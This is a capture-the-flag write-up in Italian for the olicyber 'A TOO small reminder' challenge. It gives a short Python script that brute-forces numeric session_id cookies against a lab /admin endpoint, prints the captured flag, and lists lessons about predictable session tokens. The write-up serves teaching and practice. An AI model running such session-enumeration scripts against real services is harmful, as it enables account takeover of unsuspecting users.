# Writeup: A TOO small reminder...

## Descrizione 📝
La challenge presenta una semplice API che, a prima vista, sembra non fare nulla di utile. Tuttavia, il messaggio nascosto invita a "scoprire i segreti dell'admin".  
L’API espone i seguenti endpoint:
- **GET /**: Restituisce una breve descrizione dell'API.
- **POST /register**: Consente di creare un nuovo account utente fornendo un JSON con `username` e `password`.
- **POST /login**: In caso di successo, ritorna il cookie di sessione.
- **GET /logout**: Distrugge la sessione.
- **GET /admin**: Accetta un cookie di sessione valido e, se corretto, restituisce informazioni riservate (in questo caso, la flag).

Il problema evidenziato è che il cookie di sessione fornito per accedere all'admin è errato, ma può essere bypassato facilmente tramite un attacco di brute force sui possibili valori del cookie.

---

## Sfruttamento 🎯

### 1. Analisi dell’API
L’API sembra essere un semplice sistema di autenticazione e gestione sessioni, dove il cookie di sessione è rappresentato da un campo `session_id`.  
Il target è l'endpoint:
```
GET /admin
```
che restituisce informazioni riservate (la flag) se viene fornito un cookie di sessione valido.

### 2. Attacco per Brute Force del Cookie
Usiamo uno script Python che invia richieste GET all’endpoint `/admin` iterando su possibili valori del cookie `session_id`.  
Lo script esegue le seguenti operazioni:
- Itera da 0 a 9999.
- Invia una richiesta GET con il cookie `session_id` impostato al valore corrente.
- Se la risposta ha codice 200 e contiene la stringa "flag", allora stampa la risposta e interrompe l’attacco.

### 3. Esempio di Codice
```python
import requests

URL = "http://too-small-reminder.challs.olicyber.it/admin"

for i in range(9999):
    cookies = {
        "session_id": f"{i}",
    }
    response = requests.get(URL, cookies=cookies)
    if response.status_code == 200 and "flag" in response.text:
        print(response.text)
        break
```

### 4. Risultato
L’attacco ha trovato un cookie di sessione valido, e la risposta del server è:
```json
{"messaggio":"Bentornato admin! flag{d0n7_cr3473_y0ur_535510n5}"}
```
La flag è, quindi:


## Flag 🏁
```
flag{d0n7_cr3473_y0ur_535510n5}
```

---

## Lezioni Apprese 📚
1. **Session Cookie Vulnerability**: Se l’API utilizza cookie di sessione deboli o prevedibili, è possibile forzarli tramite brute force.  
2. **Brute Forcing**: Iterare su possibili valori di cookie può rivelare credenziali o sessioni valide se la logica server-side non è robusta.  
3. **Validazione delle Sessioni**: Un sistema di autenticazione sicuro deve utilizzare token di sessione robusti, casuali e non indovinabili.

---

*Writeup by Luca Crippa - Last Updated: 2024*
